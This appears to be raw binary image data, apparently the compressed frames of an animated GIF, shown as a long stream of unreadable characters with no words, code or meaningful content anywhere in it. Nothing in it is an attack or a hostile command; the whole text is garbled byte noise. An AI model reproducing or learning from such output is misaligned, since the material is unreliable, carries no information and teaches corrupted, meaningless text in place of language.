H��4-V����8��(2�br��E'�,K����X� W�L�p�6~�#'��u�Q���k�L��7�P�m�!R��6�m�$��D�\~[a�^�ŵ���e��x��u�'���
4����7��8�A@,R�C���A� �(1���8�6M�p���ȕ�T�(/LȊJc�rL�Tm��APɻ &&��dD�7�(p$�˷H�7�P':�P:�� \?�C�eZ��N$ljӊ��<
�Z�� C9}�Z6�
����)eKOn&�F��.�|�:ܱ����+�.���� z�2}b&�Đ�TiS2U����kL\	x���w|k:G8I�0���k)������D�&�TJiv����&'��gK�i�g��7� '~4���d��C�B�ư��\�@g:>k���Lg����)]�8���x�#ʊR#r8iI/]�S'��%]ƛ ��H<�Q�T� �d�A2\�cK(�IL�XԖ<�:�Ƚ@S'�讻��@��^�5�XE�V����/�<J�D�E�'Q�8���I�n�,�$�
��Nu��3J�PWQ�௠�d�0�ߌ(�u�Tzu����"5���[�Z?�)M���ͯ�?����'��u%n��ɣ�0��!���V���{�xcC�o�c���֎B��ޕ��u�.���
ኮ�M+K�ݣ艔	�Lְ\t ��]��&�b�2��*Kr�Խ�M�%��)Ă�&zW�oG���|�GW�>��؍Jhk��H굪h��GLb-�5aN>d�����[����) �ɐu:�"&���(d79%�@�`²�ڄ*[FQ�i�Lp����iM5�L��)Ȁ��i3����)I���A:w��3!Ξg2@�x� 3�3k�� rѰ�G:
��X�$Y��Q�9���� qy���iL��=&f&Z�G���0<��] �hW���>H���[�Ew��h_�Y���ȬR�p48��g�g�+�Q̰
�\�P)��B��0h��n[;��jg6.���lى5�QNK&g����9t7��
p���#�;Dv����0��r�k7<"VZ��4h�{�͋�����[�m�')yr4�9�|#wA��C��<7�M�}��_�������x���98M(u���%�\Ƞ�~���9HyaЍ�e1y5ũ�&Wru�����|�e�.��z�%�������.��.�;Y�t�\#6';T@4��8P��M�R��+>!\��'���@}��s��r���˗RA"�8��.�����A��"q�����tG��U�cDq�'=�z�Ћ%k����M�{��*+�3~x���\�5�)5K����&?��2��R�}�~���Id��,���E��	��g�����.�������Gz"�}�fH3@{�$��~!*u���e�ǀJ�W}�b�(,HO؁�~`������c�$*�g�B��.ב�)q-H��$ͷRң/��!j�fe1�1�"�)C�nP�J분?��)�X(�Z���F}+�,e�(b8c(��)h�����e��`&wofPb5do�ei2i���GP BP���G`q����:���!'b��!�uQk�����G�x��4MR���X���CHd���=Q1C����b9�↪����y�dXu�q`�����zR-�O�VK�X��8w�hS
x��TJ���I�*Y��t�֘eظ��4�xe�st���h��X��X��9�H��#e�6yq���=�(��x3d����Ĩu�x}��p<��D��_*��jH�Ĉ���='���E �Ya�V󁳄(4�5��'y�$Y-�D^��,�GڲT~�'��Gwtz�G�;)��3��Ӓ>�8Jy�ĔAx�7�Whb��쨅W��l����ԕhG\s�j(�N�)wX��ȆrXe��o��b��Y(�^'�fI��'Z�M�J0%`N_�U�4U��H�ta�����^�hde����W�Oؕ�Y�k�3�WpT ��~�y��y��4����~���ٚ1v�Y�(A���{9P�*~^�pd�P��+9Kz��s����MN(�h�V�������	��E2j�]��c���Ɖ�i�繃�_���F�V�YS���X������mB�y�1��9�a��<� ��_\C�
a�>7�z�����ڡ�� �":�$Z�&z�(��*��,ڢ.��0�2:�4Z�6z�8��:��<ڣ>��@�B:�DZ�Fz�H��J:��K:=�xgO�5�wo&�I%�thPN:��2iZVKX���^�,�3KGvB�؆(Y���g�1�k��9s*(�&kc�lY�����3Rm�8r�Yi�ᅆ���,(��J%�$>�H�"���&� �����!bg��w�1��* ���&V�\�J's�S�䪳8����a�.���* ?8��z�)���m���*3��������v�dq�j��ѥ`Հ�*w�j��!��:�{����0�ڮ�� �0Ӧ��j�����<�5�®�O�ʯ+�� [��q=������)��	�G�mF��;ѺS�j��4� "�S�#�-
1�'��F��Tb�.+0;"�6��f:��7[$3k
��f1�	1��(!@�@5�G;�y�:���`K�iaK
Q�H����'X���BK�8��!�a�啲a[D�j�bK<W�w�q��ٶ�K�ڰYXi[fk�L��J���i�<Ș �{Q:ւ"(�a�a
q"�ȸe�:�����&�h^�jP�8�  !�  ,    ��  � H����*\Ȱ�Ç�#h�8o3j�ȱ�G� B�c/�Ǔ(S�\ɲe�s�̹�I��K �ƭϤ͟@�
��9r�*]j3��s%}2�J��U��֕�y��ׇ!ϱ���ٳhS�;:.�۳ t�����ݻe��˗�S���L8(� ;a^\�7q$3�L�㻝�������8 �֑�L���uM��Rg<x�cǆgT�m�K��M;s�x��Hx��+�k�]���m�'7�����B���h����K^vXђ˫�I�w���q�O������ wz� v�s@=vi!��9�����3�P9��YH �5�|v�Qs�g�8���΅j�`L��
�YP��Ng8e�a8b���B�ж�M��G�|
��ۏLD=�
%�}C.F"^"��\�MJ�_PO��SerU�|�q��k�%N��TY�8�`�b<[���=��#�M��7&e+Ж�$��~�4G�����N�(Xa��x߀m��э���Nr����B�i����8&���[��4h��##Qf�Y Z�"��YjM�y�:�z&hĪ:��B�3Pp�B曝�>�i���t���v�ߴ��DR_q��h ���T���+P9
���'!��f!���_>�0kC:�'.�w��/�_7Q�%��wL�}�T
Q��,ċ=�hZ{��D!�$��#�./��C5oD/��s��v��siR�+�F���G�|���e�c�x�f�R��a�=�TJsmv�|��u��c�f�K�D�Hm_�w����g�IXw��v1�(�.�C5ڃ�3._�#^ډT����o���䕱M԰��͘�s�� Ԡg�fA�0>ؠ�;��s����a�h������
�sa���V�M�#���u(�v�,}aPR����|e՛E���3yU�G=l�����9�Ƭ@��?��J�{�;�3K�����Уt9k^zT��4�"Ti�:c��}e�
�K��3>�hO��x��L�vd�xB8wHFt�+���uL0�fa��~򺂔�2u��������-��Hs��+:����(V1eV���.ea	����#N�,��
h����D�#q�"A���Wq��3�<�O��fbr�1a&a�ȡ�$r�ED{a!B�t�1
�,e���"!s\r(��aFs���CY�r�r��(�F�1�s���r�
�� l�+ǋ�&����ȱ%3�T`�w̥,�d��s	��7�XG6Q��x2�Z�b�w(� xt�S�D�az0 �
�
�B���&��<�������(\i��0U6��D��ʀt	���C�	@��Q
��\I�ƹ�kf�6��a�9V%L	���~2ϖBT3r�SV��ƪ�m\-�gE�t��G�K�Ut�0�$CH}hOs�ҩ��bB�Єf,N��BV	���5�t�R�B9�*j� �G���L�	
�0�յ��!�:D�{ԣ,
)+V,RW��5+K��K�<�)H�� �EYC	d/���S7K-3Ei�,"�-*�尥fp��O�B�H����D ���Q�Э���o��@�9X�2 � LQ{�6ހ.An��p�T%��Nak{`�#�Wh��~�T[%AneH��&�*�ЌIUC�ROuhRO[UV]�3���P$���<Ɔ�ɪ��9��4��	�O�60��c����/	�z����YU�_Sf<tȡ6΁P���@�g�3�I1Dm���F���oӜ��,��A\)�� �y�;����rȪ1f��b-{ؘ/[JΗ�ބ0��P�Ib�IbY���aG��º{��"%6��|���!N^�(��h����u���������4D�a�`O�I��U��F��Q 2�v���9�(�mS�M+d���2늞H&������U�$;�nc��9$��!����g_�%�)�5�bl�D���t�;lg7�q3Þ��z95ͪ�y�mo$D)�ZC�mL_n~��i"���;�+1h�mD��hRQR�-QzH���B�B�a�ڞ��G�]q��Z�!�A5f�8��J��x���@���m�{Gx#��Wc��P�U�JrPN��)S�G`��dȅ��AL�1�@��?tt�U_�Ϊj�Nί���[��Qφ� U_�{�⪸�]��z�ecQ� `$w��v���Gn�Y����'2�EEn �
$i�V�	�R�Ny�7F�GIr��]O�:����Y�T��F#�%4�O��u4���W��T�ogR<gH5���ޤ(�/�L�-��L�.g��A��dG��'u�/h�;�����]�{����Q[L�n��9��͟~�!���4�Y�x���'�^z�|Ua#�V�g��5L��q�>�G`.�O�h�����N|B����)�y��N$���r�҂�6�|�Sq'+�mw��g�A�+�aĒ��*�4��cbaf�Q6+��q�7�7�T}zP���ǅd؅exs�fK�
�T8m1fw+V�p�7�c��B[�`o�zx;�ct�t�a[I�q�UV�����%��XQ��7D�I�4S�r��8��X��F��8���O��'��O�b|7Q��s8���%�TQL�O��J���É��~�B�c�D�Rq�Έ���J\xQ'a�M�������M��-$��8y�-�tj�Qi`xsaN�����8��$��xMcq���~'�_�Y��SyY	�i��uTl�d���`gVjf-�Fn�4}�}Sa-��Ca�S֊�s��67�u�[�RSg�cXpӈ�\��%9i��GB�t�i����kcZl#P���eYKٔL����2��T�a!�v�I�]��T|�f#e(�<��X��P^g����O֌wx�n�
*��ec�CMqyn�#�ey�s�uX�h��U^=���0*V�M�4����	����0*����	��ڳL�`�Y�󧓁��iY�%�Fo�i�
�`��Ɉ;u�A��e!Q�*Q6�Im�j�Q�Q��Q���ዄ�h�&�Ք�;+�^�h��I�~����O����4�$U��ɓ�)�7��C8����Yo�ɇ��`���9�)�a$�S����d�y�ᇄ�q��teӠ5q�z�����ڡ�� �":�$Z�&z�(��*��,ڢ.��0�2:�4Z�6z�8��:��<ڣ>��@�B:�DZ�Fz�H���!���
�8d�S� rxʖ�S֏�D9���TZ1�/��͇q�ُ_j.�Re2٤*�R�8��iZP�����u
#:���D5���է>�,��k�����!��#��ڨ��o4�DC��R�TRm���P��+�rZG���z�8C7y����q+r��Bp�
 ����3��L�J��9�1��
!t��ʺ(Ȭ��
��к�:\bg��j֧c��ԭ�A�A\�^������Q����:����3���jJpʯ +�;a�1K{�H��.K,���ڰua���D���JN&���
�8e��&k�*�z��Q�;/۫��� �8+{)�G9�l�:��B���={45��,ۢEk���
�*��8P�T���!LYK�ySS����ӵ4q���D�f��6�^sh4������]a���^��d{�ӷ�J�W+i�����A��K��B9��������ҒMV'ⱒk�9���q=VHP۹]1&���K9�������K��x{;yQ{˹��֗'RV�AK��c�M�Z�  !�  ,    ��  � H����*\Ȱ�Ç�#(�ň3j�ȱcGo����go�Ǔ(S�\ɲ%ˊ \ʜI�eHv���ɳ�ϟ@1��v1�ѣ5ō[���I�P�J����9q�j�
1�ȝO��K��q˪{���{k�ʝ[0kL�x�*]�S`ؼ����.�8o������ǐWƃ�\�Ș=�[��o�Ϡ�w7��Kq�<���٬�c'dl���ې�]-��7rn�����9r����oc���Ƴ�;:kp��M�l�;Գս����x���A��F�z�d��y��.m��1��3��J�D�dQ9�6�9���z�Y?��:�1�Z{�c[�r��}< ;F�9h��:����Y��b��Sbd��\���@2���4�����\{��]�P>��O^@f��E�\�a�2�T �E�T:���M[�<��2�� m��Ε8��^½%xr�D'eeB�Z ;�(҆~I<h�8�Ei�&�aL�E����;0�S�I��Na�j%N9,v
�>��8@�#N��]jN�S�w��/~ԅ��4]J�3��()O��Nf�4vb*��,����kK�
t���XKH�r8�̮Z(�ڦ����vzb<�����ͷN8�ʤ�bJ���{V ���w�zۂ��ce5p��M�f�����H�����g|0����߈�S��3�vUD�nD�ł1��d�3t*��k���\ؾ�stD�Gxf�t�9���;KG��#.,X�Y�-��Y�ӝt���Y�<֬��C�m�@S���i[�9��?�m�ҏ�
�8>�rLXOd�g��\q�$+^�=�-د��cykV����M�r N��B5N�d���y \����"�՗��y�E�|��[&\�����iWY<��� �M��6�rY����*�9�~m�}d�E=A3��}\�&?�\�O����/���f��9%泵�*�Z<�6�U�syP��t�L!0�PT����$hk@s�@�<.&T	�2��d�6n�W�@���A�!K�V��)&�F� ��A��H!A�ʗ��#~���3���8��
�XkiNT��R���'���n��q��T�
;�2�<���E��/�$M\�
(�4re2�C�I���T��T�i��)r YIo@���LW��@�G�tDPY�]��t�e{������J���=I�҄��]1&D)��ľ>vr*�x�:��;�cO����c���Q#1�+ݲw�r39*���Ҵ%|C$�B��1i�����Ơ���
�=t	w�S�wtk:�62����%�U�ҩ�S&�4���t,
��69)ӏ��N�$'��g6�7�x椉3_���hI�;��RJKZ#�X�J��3O٧�nO��df2��P�r,t�5�Q�u��`�ݒ�E��L��m�^3��!�q\)�5��}ڒ�L`�HT�����LS�bK���=���z
�G�R!O	_PDN��H$"kP�x�H��=X!�JK��f�m
�&;�s��E|���\�P��/M��"sD!��ƥ@9�b������5G��f �ʷ�zn�Y�5u�[m�����KH�&��u��+[	�[�T/���lOȠ�P����B�X	�P�T-���ʬ�DKZ�[�j٬��Y9օl��Z�TT���O�ʍ�A&��3с�s2�<�@�iUiݨ0-��\6�J��� ���v�W����w�KʂT��,�(8u�!�.7��-f�D�FD"�.�e#,�T�'-HN6����� ���!'N(�L�lc���`�	�M+W5��*�'�rO�� &�,��
������y&�R����#�.=�M!v��<�(�mJ���.��6��B���kC�u�
ND̏�C�h�֤#@)��I��h�*$u
��;��U�%�Y1E:��M1�5���_>t�ЬQ���Bz*��N�Ӂ#O]l���4��CJb��~����ɤ���j���(A��	�؎{��G2g� ��v�r���pۦ��ّEh������H�YR����89 �{��'<#2�Hޤ�l�3��rivA�B�]�dL���8D��ti����V�T�z��������0�ɮ��1B!d�V4�v����Ѓa��72n�x�2<�ibN��č^��j��4	"a�͍��j5]���O�l�R��p�ȺO���T�2\�Kb�ޒ���!f�HBx����ea�g��v����GI� /��6#���1��`
�i�I@>�y��B'}O4_���D��qY�1br���Y<�>�Ղz�A\�}��H�ݱI��{/��c�VY���C}�2�����J�F �J�A���L��}�3D�]�!�?H��^O�˼������"�~��|a}oR|ò=�G]�z�(xQ�"(��uT�$�~��qD55,���id�*!�"�"�,&�^q~*7Y��7��*�f��'rg1���.�q� �pB(Gb���<���q^WA�"fP�qw$SW�b�օ2[�^8�\����}J�Md�(l8m(U(lS5��UU�A�aS�`{hSO�Jxr�K  �����G`���F$�F�l�!��pƗG�V���4Ɖ�DJ����tl��w{n�OwQ�2Q��5�a��y(Q���v��`|X�a'/EaSaK6f̨�d2-�j��M���AIq*������؍��g��h
F2��g���ܸ����،�9�H�H�-f^91A+Ձm�ب�	�ua8�茁��#O�-O�R�5-�.��W�Vz�\�H��hS�XO{#e�d^��0�+))\�ły��W���1Y(7�9�N�5$i^�uhAG�r!�w��hr�K�Li�My�N�0r�Hvt�ّ�h��(=⦉�8r�хcY��t�e�Gc������e��S�?�¶5lh0v��1�j�X��t�@	�:�U��O��R�$��^��T�T��V�_9���0{���jP�]�pb���F���v����X��t^9�y�!��񖛾�f�Y�����,Q�1��	aU�O�`*|e� e�O�df�BO�������J�Y���h�f��y��i��{ZwS�5oi�`�.2����S�h�����hԟZ������A
�-v"�q��a�	��T(�:�ʖI����4�c!��":�$Z�&z�(��*��,ڢ.��0�2:�4Z�6z�8��:��<ڣ>��@�B:�DZ�Fz�H��J��LڤN��P�R:���I��#����?�i�f��5b*Q�t�\�(^��J-��jz�0�dd"��JT���S�p����ag[�����Z��}�o�H�/�2i� �ƨ01�B�,���:F�:�Z�����MD z� ��9c�x�株����5����u4��6��"U��;-H�������3�
.����ج۲|�
��d���J�ı|�����61J��!����}1�YY�����>Ȋv�f:����4�����'Q�ʯ���2�Q���RJ��
�.���w�Mf�;�fr���a��ZaJ��[�(z�&�	A�,��)��tv/#(;�j�Q�3�:)wq� �6������?;��D[�(�ә�:�=�q�0�7�Jkl�'�犯�`��?�K6��5)���'K�bfJ�RWM;���E�����
��d�Zp:r�z��D�R�O�Q��;9=��e"��z����^�#�Q|�*NY��d�d�!� ��9N.�x�"  !�  ,    ��  � H����*\Ȱ�Ç�;'�[ċ3j�ȑ#������ױ�ɓ(S�\���8s,cʜ���q��#I��ϟ@�F<w�\8�H���(��HxJ�J�J��u/��ʵ�Ï����鵬ٳ%��+:�[� p�����ݻa���W(S���L(� 9]^<�7q"3�L�仜X�V�\R�s��rM��:��SG��3TհU�#��¿#m�fl/ <v���ࣷ��_n����u'7�u��֕�|=�����W���Z��ϡ%�_ߓp��S������:������ r�;�p7�c���]��~F��=�u�k�}�]��'�9w|=�s΀�i�a]�)�
��O��g6��b8a���B��f M倗�M���?�HOv	VoC.f"^ ��b�\R��V>5UN�!���%�����TY�8�`�d<[��"���d��I����z�h�s3�t���y�9^�g��6��=Yt��⤓��e1�)�jzZPB�bb`��՟���*��?�	�Qr(f��I�L��:�:���X�ڪXP�
D"c6�t*�:6���&��:��Ŭ�����b����<F��b�
T���j��]�)X�r�����b����v�s�_w�������'���ekÅ-��[s|��B�#`�a)�*3�W%i\Y:Z����5�F3���EX<����
|c�xm���5�L��"����T/�u_�	�][��u���3����{�9v�{�Dԣ]j�����]3<��\Y��A�wj.Ku��%�;V�u�܇O66R0@�h��eb<�Wޤ8���ua���s ���#O�E�9��wu;������	z3�M[ׅ@�Υ�U̗pz�E����9�u4��)�U��C��Sծr��/&>��TO8�Μ{�]1����i���=�O���=��`�S��P' ��L�Tg�	�/l�rE2qL�/��	�.��)���!��h��\nNa`Y�����0*�H�dxqf'nsh��·H�~�M<�̡²�$�=�ʢ�!?���|y�wF��&^|i
�x�[Q�3���Bn�$,��(i�a̅F����ةPUheψ�ɊA�Q'� � Q��`B��Lk/3<ȕ�<�E�H��R(�/Bf kt�D�Q=ù#p9�(
r�F�9WX���DGHx�LH+�£�IR(�p�kҐo��F�A�;�B[:$O��=�L����
Q^/�X1 #�a��6Ƥ)xr�-gr#XEEM��@0�2�$� ���u��`Ɛ���^�hv��9Fk�\�Q8�h�
TC�	@��&Ύ�,���Uh3�v�0 怏7e�+�rEHKQ�H�2P3�1�jA�)�ݭ ��@<�Q��w�J��3��4�Qq�#��k/�&QN�R���!�r�s(b�!e/�̩P�y��!:�q���e)��*��,2�\��<��Մ��(JJ8B�E�
e��L:
*���q/CB�@��X�"��}��AVɴ?�r��,�*Tդ<ʯS�OG�C�j
g��!J��b�r���͗�D�N��
�b+�K�e��� n��R�p�%� h{�(Nm=�Le`v2�OŃ��$��D��4�#�S��AHj�L㠔Q
jU�JS ���
=�#�Y�rs��(s ;Y�(�&���u,��r����l���&����M"��e3!���@>��y�8)������m-E3��dt1�5I�r��5!�q�;����ƪ��^0ܑp���xq~��]�S��$�9&#Y#6�*UX��P)���7��X�!x�-B���=�!�]sl��܍����&_��b���$�ӳL%����!$�rj�Z�x!Х�f���h)3�"O+�9)�ƴJ���n�΢�q]
���Ho^V5Z��5#Q�S1�����^U�1ٰG�b���S�޵B�(S^'\�n�93��D�x~@=�8�Z#��IȽ���$\�.���F�<%�WV�F��c&6�>H�Z�g��[���F��OAY!�	xR$��z�1	�v��� l%�;�KsBh����)�u���w7�Q�R�1l�G*O!b$�|���%
om>!��̧���u�����D���3�m����Y�Bޣ�q���Q_xA��А�&�]@H�C���j �����lOH��*�{Q;!;^���B�=��k�{T�*h�('7̉��vLW��0
F�Y��3�?��R����%d��93��L��:?	{-��s��r��{ӯ����
�������1k����.����������D��:��1�=���]����Jl�|�DGt����-m�"q����:��7��}?��^9�+%���n��Q�B�7��tKA" ���4}��w�N �q����K�g��0U7Z h<�!%�\ڒ�Gw҂4��Z���`�;�!����W"ME�WLHx�t�~ANnv��R��C$7�x@8[(g+!Bxe]�u��:w�AR�A[�_�:�a=�T	G�T(��VU��DO|�~�}؇:�k\��oȅ � ���舐O��8��8�d7�(S70��eoTv^X<t�� �n�!Oc�~���r�C�Akl���8�
��vs��؋��_���q|o�Z�.QI��J�aO�XJ� �Ҍ7���g��8��"����(��؍��L��yQ�O#Z��S�3S�(�8E�E�)t9q8J�H��G]+Ve��igR.�^�S���P�!d�#��4��5c��T�	�s���Dod���9S�Z�16�D�v�[eTF�R��e�8�y��4�N>)p�x!	dr�� `�ㄒv]�b����6b7R���hv�у�xea��.b#q{�G�>׊[i�y��ԔG8x��]�NlH]L�l�T҄��IyٗL��M~�a�-�$C�bFٔY�%	�vc�M��rq�[�Y�)D�8��;h邸�
�N4#����5��p�A�����AF�f�L}#�f��8���8��v���مK�h�֜z�v�	x$)��y�p�i��!7�}�+���@�y�!bd�L�:�~<'�?�dY�	W�D�0g��u4Ä��t�ٟZ�z���
��ڠ���:�Z�z�����ڡ�� �":�$Z�&z�(��*��,ڢ.��0�2:�4Z�6�@���7*@�D�ڹ�"wai4�TJҘ8�4d@�2BJ(y{�N����b8Ef$t����2t8���T�҃a3of�v��a1���m@U���0�,��WH����|�#�&D�0�,�xcm1��1P�y��@S�ag¨�j�t�(A�t�R~%ш`����z8j��z��a��4���\b]��
 `������*�a��J`
) ��a�q*��j��ѫ�ňṐ��EX����
 Ⱥ�Çު4���Ҭ��0�J��jsꁘ=�J��;
)�%��"(�f��1�*�IЪ�gq�?QW�
�nq�?SPj�?¯�")��;����fu���&�����"�n���9��Q����u�㪶�,;�:����] �=�:�jCj�4�J��UQe�R��U�wJ�g��Q�k�餂�8�
�o�g�1� u%o��Z;?�uE�22��G&[�@A&� ]�fJ+9Qf�
�u�j�@����*�C��|�gZ=�Jt��ݵG  !�  ,    ��  � H����*\Ȱ�Ç�@1�ŋ3jܸћ�s��ٳǱ�ɓ(S�\�r" �0c�d��]� #g��ɳ�O��U�I��Lq�ֽIҨӧP�.dwN�� /�j���cȜM��Kv��u�&�];�����ʝK��լu��D�Φ��z�I�] q�+��5��Ő#��/����3s<��+`͠C/<7�����̉�5j�W]�N���ٸ�^W�tn��̽e��x^z��a6.[\����Kg�����sG�3��O�^�/��c������[}뤔��יO�:��A���}��(Q%�N�bt	��Z=��:�9[|�s[�j�~: ;J\Zs}�q�U�16<%Jv�9��uN:ѹ�#C�SZO���87��W���d ��Hhc�r���}cL $@e�%��9ty�<Mr�"����[�CNf����n��`RIfd��c� mا�����,Q�fhT^��[����|q��RO/Mzd:�'W┳�-��:����8�
�未�~T�ڡ�?Y��7�S����+�$B*�a���9���X�b.� <��ʒ�K�9��呶
�稯���_�6h絋����|��3�QX.��M���e(��{��;��d]�����0C�ʇ��z��&�W\���C���rL�UQ�M<�s�A\��+3wrO8C����
4h�ӑ\�����H=����ŕ�#N-�Pgm�i�dg]�J�5�V�φ0���c�]2d}	�5]/y��+cݨf�)�6�x����$Q��Sr��Cpځ�*�܌���t ��``3V��:�혙+6t^ �����Y�}����uQX�ڒy=M��k�{�����$��F�e��sQ���b=�M�8Y�S�WuO%O�ˡA/���{?W�N/z���r��`N��(���G�����˃�'����#�{$�T)�57�[ � &p-�UrDJ�ɓm�A��|�&��`YT�
��z��`�&�C�MMTa[�B��� ���H�ؗ��,�1W�w��ZG\auJ8����IDD^pG�ك7�G<�E��#(Q��C$H �%��"e�&���C��a�B%�i&U��%	M�4�&%����4/q!��D&*J%LۣV�"��ɃvH:�2����vcJ�������LhR��G@�Oik�*5	}�c�2�����c)^;�mHBƌ|�`7���1J�ܨB�ʧ�▿�,&�L��*h�!J��p)
d9�I��C�wpk:G65h���� �_��)��%�9��d,
��D1�@�r{��sc�BnB�X���#hx�t�����EҧJ)��dқQ�aeLy7��e��U<E���� rdB�B��ʒ��4���dk�[/��S�yZ� ���+�q����%L�J�R�p�� ���I�t���`Y*Rf�U��é@���V9����/�,��@"5���Z^U�#�Q�L�L�eA�V�	��=
�H2vΡq�
9F��U֔!�hX��$j��9����ʭ����@�QM��V��ŭ��W؞��L��Q[�T���z�Q@}����Qg���v�۽廯x
�/ӾJZT�	����&�0W)�,�b��J��M�I$eݟУ[%	�p�bUf
�6 �'e�)4��S �"�@��s�=��M&DD(�o#s��ϛ6�h}R�lh{2�,Bz�.T ]�Gl`
&�;��@n�!�V���D�!y�8ݮ(D��X�	ӼI�w�Ke�,&����Z ����(���a���!����1>�=k��:�z՚��3B�l� �uyfI��#b�D�$٩f��;f1ъIǿLBc����d���4縼�ZF�4�9��XR�ԁ]��7�ҍ^5_��H:20���PM?�#`Ƌ�a���L��uCn�KÄ;�N	�a��W#R�J<��3�/�6IXb��8ˢA��碘n���rV��[7f)��u2�*��"0���x�:��s��	Bok�DL�>�C���s��߁6��urE�gx��Ԉ�6��;\6Ev�M�
��hc������Ca#���i�͡+ds���E�m�iUN'zim�?N"Q��=t��u(�����RBsd����Tt:��D�	�re�.��r��m{C���"��F��#�wW�#3��O<�������q�H-�+��*j��Mc7�LN5z��0�20\z�:wx���T���N�H[� �n�E��ҟ�9
�H�������贿���r��3l�����[�����Pe�|�8_��u���{��=�WX���� ����>����)�ԥ�ԃ޿�x���2��.+!+��eH���)�@�@S�"E���@*�'����r������`n��k�N0^��7��{2E��o2(Eb�d<��b<�$QkC�@�y19JL�<M��>q�N8�MX���ru|U�M�6��^�2E�9c(U`��A��`d�`E�?M���sW�X�V1 D�ႃbG`��8�8!�1_�!��oW%k��A����8�hgG�(�#����1�FF��w��s��/F4(s�J�xd�����
qpo�$ ���ԋn�`�%�ad�P[�M�� &V*P�Ѥ����c���av�f����ը��h��d��s�"��V^7/!+��l!��4�$(�v�/D֋lx���vè��K�|�XvOя+Ae�G�V���R�$aX�O�[��jFO����]�4xg�� 	�	�4$B���E�&�Q�w�o�Fy��@6 ;ٓ$����<�CDy�d�;WeO�p�È҈U���Q9��4�vd�S8�ZI�\)U����D0�؆��Ni����Sc��
Ð^YhSM�U��O�tR�$MUZaY�T�d�EZ�4���a��AtǉTȔ�G�Xy��i`Ph�g�W(��~<�<������əљQ�)���y�w��U!v���(�ЈO}A*}�]���I"���B�`s�q�YSF�b��:���ҙ��yU�$��J�L�J��<��i`�y�Ai:������l�9q�)��
�Zy�R'#9�ei���
�L���ɝ����q�jrͤ�j�칠:�Z�z�����ڡ�� �":�$Z�&z�(��*��,ڢ.��0�2:�4Z�6z�8��:��<ڣ>��@�B:�D:��WeV��C�	�J�#�V�UO�`^ɍO�'Q�MѤ������:	�T�@���x:�)���8�t�t�	!9n�$�&V"���t%�w*��&}#'Z�߁g�R�c���>B>I���r7e m�LՕ��U��:��W'��5�b�bQ�� X��Y�+ё���z�2����r���Ҧ�*��!d
A�
���jm�Jڬ���A��!���:��́m�@�:��A��:������(�:�`����zyd$-��y��*�CË��,�U+��je����ٰ���0Qg+�̑���� sv�+�&�#{��1�W��.�c4"�&��/�*��"�5��ၬ�a�;�4;�<!6ovLW�0T�.'�F���J��=j���KX��C�:�Q�IV��!i�ݖ�eK�aKIFֶc���c�
��r�J�R��2�A�v�A�Ŭ�eX�]g����J�Ԋ2{J!aт���BQ"d���3�9bcA�  !�  ,    ��  � H����*\Ȱ�Ç�#h�8o3j�ȱ�G� B�c/�Ǔ(S�\ɲe�s�̹�I��K �ƭϤ͟@�
��9r�*]j3��s%}2�J��U��֕�y��ׇ!ϱ���ٳhO���踴p��9Vjܻx�
�)N�_�N�
�������y�qM �đ$츲��v������ �[G�����YD�:bH��ֶ���Qڸ.���c{�3�ַ� !���}��]z��m���S�ճ������فI�5�j�Ò����MzÓ�G�S���5��܌�48�8A�^v�;�xGSd�R^��C�~Vȑ=�	��;�� ^!�c��$n�9��4�9�px��޵[b�h#C�LTE��ahz#֍D.D�m
�T�x��a��)%AЩ6�X�%y؊z���`��f���Z;]� W2��d�E�v�����a��e��Y �Å�!;��iY�'c8���'~�D���:%f�7;�aN�=Z!p��F_���Nw~�T����_����M.V&\��dh�ғ��;�'Y ��x&�ʙ*M�{�:�WX�~j��?5:P���D�q=X-��:gH��(ڸ^멷���-��gS��- i�a }�J�x��{�h������壘k�k�]�	�pu����"|��.���Ũ�ĆI�hZ	�유J�x���u)��.w�C&w��g����]+��Ώ�[4Z��h4�,�G��v������=�THc�ɪVv���}�C�-6��L�c���u�;n��h_&%�V5�K�%a�z�\׎��⅛&3S����@�j��9y7��W2�N݆-�e��9����{��z\&e~z�7��و������ږ��a�r���n��q��@������ø�h4��-kVNWSO�Y��N���U>��d_8��,{�_�y�;��9?�^%�P����2$���;���[����-�3�_�&�� Ⱐ_�Ǔ{Kb��]�a
��q�_����<eaZ�� �� �LO����N�p����.g�x���g���u�O)e�A���$�&���.�,���hX��$'�RW�@��d�^��т��eDĉ8:���I3+���&���-)�
�%�HG <�Jc8Ǫ`�8bL�@#�sT$hK�;�� $&�>zdA��b5ȓyg��(�P�,�K^%����lq&pDW��-Ÿ�.eѥ�
b)�`(�<��S��(1�u� ����U����+>�eP`���d�-1�&����&�F�,�W��q�*+R�9k��p\Q%J���� � ��ٟJp�MP�h�����s$�69�@������5�/�鐑)8cO��iʁ��4Y�FZ`�1YBk攅 8Ijh��!qh��1�j�G%K:�U1��EpR����q<�Ӹ�1���	�7$(� #k=j\a��4z]��<ʢ��� �!G8�9�p�ċaJo��9�0�FY��%�LͬR�Q���b�$�@v%�BB��x%g��U<&v)��HrΨ�������H>������#�T(� ��9a,\k捺 fh��`�BC���4�TY7"յR ﰧI�Mh���o<��pF��f��)����]�5�S���J�c$��
�`��S�'>1Il�{\�=�
 qd"��r��L��۠�X���ü��9s ,��~X�zP� �J�m��Z�E�'�Mt<�����5�X�ش��p�?��\-���_�7c��r���(M��� u�+��A�b:x��8[Uʇ���h�
��B��΄�,�3gC�'�:��(�3D��R"�+7~�Aҡh�^��'�ԉ@bId����A�i�|��
�3D��f�����^[L, -�ѥ���N����z�t ��^�c��>MU��R�&p_N�����d7�<�9�8}ݣ>��Q/�)����h[�$�@QJ��`�!�i�h�=��%�.��{�#a7�ӎ�Jl��I߻#�yI�.�QS� ��~�k�#=3�#�e�8\(�b
͒u���b��B���o$�V9�W6�r�lZ��ŵK,r����&�Z�9�m�e�=H��q�6z���f#5-離�&�_<%�d�
���3$>L�Uס�s��$�i��W 0�g�	�z�3v�P�*Q��.H�v�_�>��b��2�L	�1�����E;�S��%��LJ������a���'��%P9P�K1O�5�{Q�y�}�]��xLϕ���=BP�	�!���Br��~�Td>��̺+�}��$�r�j%&�q�������g�:�`��'z������U����sNp6s>�WG4�N�~�6���TI$D	�'V~�z7AN8�ĶN�2�'��3�!HLoL*�?��D�v���gR.h�"�V	8�cAI��r";E�l
DU5�r�L�'rFx��G5�^H�R!��(�^��	�m8oN�eihpaC8� h�`/�N/�`b�L�G!�g��F ���U2�=��������؈��hK�?�����򈌸�Vk�����M��RJ�D,շ�io�@?$h��`} {*p�tH��e"!����^�������+d!�Fq0!��}v�JҔJ�AL�XLޘ���X�M�W.wѤ��ҍ�����︎�rQcA��B5�\
